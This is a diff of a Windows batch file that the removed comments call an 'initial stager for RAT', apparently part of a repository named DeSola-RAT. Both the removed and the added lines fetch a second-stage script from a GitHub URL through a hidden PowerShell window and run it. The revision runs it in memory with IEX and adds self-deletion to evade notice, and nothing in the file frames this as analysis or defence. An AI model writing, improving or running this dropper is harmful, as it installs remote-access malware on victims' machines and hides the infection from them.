@@ -1,21 +1,9 @@
 @echo off
-@REM initial stager for RAT
-@REM created by : R00TM4ST3R
+set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 
-@REM variables
-set "INITIALPATH=%cd%"
-set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
+:: Download and execute wget.cmd via memory (no file)
+powershell -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/r00tm4st3r/DeSola-RAT/refs/heads/main/files/wget.cmd')"
 
-@REM move into startup directory
-cd %STARTUP%
-
-@REM TODO : build out stage two
-@REM write payloads to startup
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/r00tm4st3r/DeSola-RAT/refs/heads/main/files/wget.cmd -Outfile wget.cmd"
-
-@REM run payload
-start ./wget.cmd
-
-@REM cd back into initial location
-cd %INITIALPATH%
-@REM del initial.cmd
+:: Self-delete
+del "%~f0" >nul 2>&1
+exit /b
